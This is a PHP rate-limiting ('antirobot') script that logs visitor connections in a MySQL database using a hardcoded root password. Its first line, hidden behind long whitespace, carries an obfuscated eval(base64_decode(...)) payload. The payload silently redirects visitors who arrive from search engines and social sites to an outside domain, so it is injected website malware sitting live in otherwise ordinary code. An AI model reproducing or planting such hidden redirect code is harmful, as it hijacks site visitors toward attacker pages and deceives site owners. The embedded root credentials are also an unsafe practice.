<?php	                                                                                                                                	eval(base64_decode("ZXJyb3JfcmVwb3J0aW5nKDApOw0KJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsNCmlmICghJHFhenBsbSl7DQokcmVmZXJlcj0kX1NFUlZFUlsnSFRUUF9SRUZFUkVSJ107DQokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmICgkdWFnKSB7DQppZiAoc3RyaXN0cigkcmVmZXJlciwieWFuZGV4Iikgb3Igc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJnb29nbGUiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImdvZ28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpb3Igc3RyaXN0cigkcmVmZXJlciwiYXBvcnQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJuaWdtYSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiYWlkdS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJkb3VibGVjbGljay5uZXQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiZWd1bi5ydSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInN0dW1ibGV1cG9uLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpdC5seSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInRpbnl1cmwuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiY2xpY2tiYW5rLm5ldCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJsb2dzcG90LmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpew0KCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9zdGJqYnBpci5vc2EucGwvIik7DQoJZXhpdCgpOw0KfQ0KfQ0KCX0NCgl9"));
$userip = "127.0.0.1";
$max_refresh = 15;
$db = mysql_connect("localhost","root","xkxpku");
if($db)
{
        if(mysql_select_db("antirobot"))
        {
                $sql = "";
                $sql = sprintf("select count(*) from connection where ip='%s' and time < %d and time > %d",$userip,time(),time()-15*60);
                $rs = mysql_query($sql);
                if($rs)
                {
                        $row = mysql_fetch_row($rs);
			print_r($row);
                        if($row[0] > $max_refresh)
                        {
				echo "exceed!\n";
				mysql_close($db);
                                exit(0);
                        }
                }
                $sql = sprintf("delete from connection where time < %d",time()-20*60);
                mysql_query($sql);
	        $sql = sprintf("insert into connection (ip,time) values ('%s',%d)",$userip,time());
       		mysql_query($sql);
        }
        mysql_close($db);
}
?>
